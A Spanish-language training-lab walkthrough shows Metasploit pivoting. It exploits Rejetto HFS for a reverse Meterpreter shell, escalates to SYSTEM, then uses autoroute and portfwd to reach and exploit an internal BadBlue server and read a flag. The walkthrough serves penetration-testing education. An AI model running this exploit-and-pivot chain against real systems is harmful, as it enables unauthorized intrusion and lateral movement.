
# Pivoting & Port Forwarding con Metasploit

{% content-ref url="/pages/LrtfeCnWHNX4tnKvmglw" %}
[Meterpreter Tunneling & Port Forwarding](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/pivoting-tunelling-y-port-forwarding/meterpreter-tunneling-and-port-forwarding.md)
{% endcontent-ref %}

## <mark style="color:purple;">Lab: Pivoting con Metasploit</mark>

Este laboratorio se centra en el concepto de pivoting, una técnica crucial en las pruebas de penetración que permite a un atacante pasar de un sistema comprometido a otro dentro de la misma red. Al explotar las vulnerabilidades del objetivo inicial, se obtiene acceso y, posteriormente, se puede pivotar para explotar y acceder a un objetivo secundario.

### Hosts

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.15       INE
127.0.0.1 AttackDefense-Kali
10.10.37.9      INE
10.2.28.213    demo1.ine.local
10.2.24.96    demo2.ine.local
```

Solo tenemos conectividad con `demo1`, y para acceder a `demo2` deberemos utilizar pivoting.

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo1.ine.local                                                                                                                           

PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Observamos que por el puerto 80 corre una aplicación vulnerable que ya hemos explotado en otras secciones: `HttpFileServer httpd 2.3`

<figure><img src="/files/TVCkK8Z6wdkXZP89rcVO" alt=""><figcaption></figcaption></figure>

### Explotación de HttpFileServer

```bash
msfconsole
msf6 > search HttpFileServer

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
```

```bash
set RHOSTS demo1.ine.local
exploit

[*] Started reverse TCP handler on 10.10.37.9:4444 
[*] Using URL: http://10.10.37.9:8080/p0dcjAqxi
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /p0dcjAqxi
[*] Sending stage (176198 bytes) to 10.2.28.213
[!] Tried to delete %TEMP%\DvaGAaacZZF.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.37.9:4444 -> 10.2.28.213:49244) at 2026-04-14 00:35:39 +0530
[*] Server stopped.

meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Ping a la máquina interna

{% content-ref url="/pages/LrtfeCnWHNX4tnKvmglw" %}
[Meterpreter Tunneling & Port Forwarding](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/pivoting-tunelling-y-port-forwarding/meterpreter-tunneling-and-port-forwarding.md)
{% endcontent-ref %}

Observamos que desde esta máquina tenemos conectividad a `demo2`:

```powershell
meterpreter > shell

Process 1980 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> ping 10.2.24.96

Pinging 10.2.24.96 with 32 bytes of data:
Reply from 10.2.24.96: bytes=32 time=1ms TTL=128
Reply from 10.2.24.96: bytes=32 time<1ms TTL=128
Reply from 10.2.24.96: bytes=32 time<1ms TTL=128
Reply from 10.2.24.96: bytes=32 time<1ms TTL=128

Ping statistics for 10.2.24.96:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)
```

### Autoroute

#### Ver IP de la máquina 1

```bash
meterpreter > ifconfig

Interface 12
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:ad:7e:6b:68:63
MTU          : 9001
IPv4 Address : 10.2.28.213
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::20b6:75f6:1f06:d060
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

#### Configurar Autoroute

```bash
meterpreter > run autoroute -s 10.2.28.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.2.28.0/255.255.240.0...
[+] Added route to 10.2.28.0/255.255.240.0 via 10.2.28.213
[*] Use the -p option to list all active routes
```

### Escaneo de puertos internos desde Metasploit

Usaremos el módulo `auxiliary/scanner/portscan/tcp`

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 exploit(windows/http/rejetto_hfs_exec) > use 5
```

```bash
set RHOSTS 10.2.24.96
set PORTS 1-100
exploit

[+] 10.2.24.96:           - 10.2.24.96:80 - TCP OPEN
[*] 10.2.24.96:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Observamos que `demo2` solo tiene abierto el puerto 80 con un servicio web.

### Port Forwarding con Metasploit

Redirigimos el tráfico del puerto 80 de la máquina objetivo a nuestro localhost por el puerto 1234:

```bash
meterpreter > portfwd add -l 1234 -p 80 -r 10.2.24.96
[*] Forward TCP relay created: (local) :1234 -> (remote) 10.2.24.96:80
```

* `-l` - Puerto local en nuestro Kali
* `-p` - Puerto abierto en el objetivo
* `-r` - IP del objetivo

#### Confirmación

```bash
┌──(root㉿INE)-[~]
└─# netstat -antp

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      3059/ruby
```

### Escaneo de puertos desde Kali

Dirigimos nuestro escaneo a `localhost:1234`

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV -sS -p 1234 localhost

PORT     STATE SERVICE VERSION
1234/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Encontramos un servicio vulnerable: `BadBlue httpd 2.7` que ya hemos explotado en otras secciones.

### Explotación de BadBlue

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf6 auxiliary(scanner/portscan/tcp) > search BadBlue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow
   2    \_ target: BadBlue EE 2.7 Universal      .                .      .      .
   3    \_ target: BadBlue 2.72b Universal       .                .      .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/badblue_passthru
After interacting with a module you can manually set a TARGET with set TARGET 'BadBlue 2.72b Universal'

msf6 auxiliary(scanner/portscan/tcp) > use 0
```

{% hint style="info" %}
**IMPORTANTE**: El payload `meterpreter/reverse_tcp` no funcionará con pivoting, debemos cambiar a `meterpreter/bind/tcp`
{% endhint %}

{% hint style="warning" %}
Si el laboratorio se cuelga eliminar el proceso de RUBY en Kali, ya que puede colapsar: `kill -9 3059` y volver a ejecutar Metasploit
{% endhint %}

```bash
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
exploit

[*] Trying target BadBlue EE 2.7 Universal...
[*] Started bind TCP handler against 10.2.24.96:4444
[*] Sending stage (176198 bytes) to 10.2.24.96
[*] Meterpreter session 3 opened (10.2.28.213:49553 -> 10.2.24.96:4444 via session 1) at 2026-04-14 01:16:39 +0530

meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Acceso a la flag

```powershell
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2020-11-07 13:45:59 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2018-09-15 12:42:30 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2020-09-09 10:08:52 +0530  Boot
040777/rwxrwxrwx  0       dir   2018-11-14 21:40:15 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-11-14 12:26:18 +0530  EFI
040777/rwxrwxrwx  0       dir   2020-05-13 23:28:09 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2020-11-07 13:17:23 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2021-04-07 13:31:17 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2020-11-07 13:17:24 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2020-11-07 06:12:52 +0530  Recovery
040777/rwxrwxrwx  4096    dir   2020-11-07 12:06:43 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2020-11-07 13:45:53 +0530  Users
040777/rwxrwxrwx  16384   dir   2020-11-07 06:12:46 +0530  Windows
100444/r--r--r--  408692  fil   2020-09-09 10:03:42 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2021-04-07 13:33:08 +0530  flag.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag.txt 
c46d12f28d87ae0b92b05ebd********
```
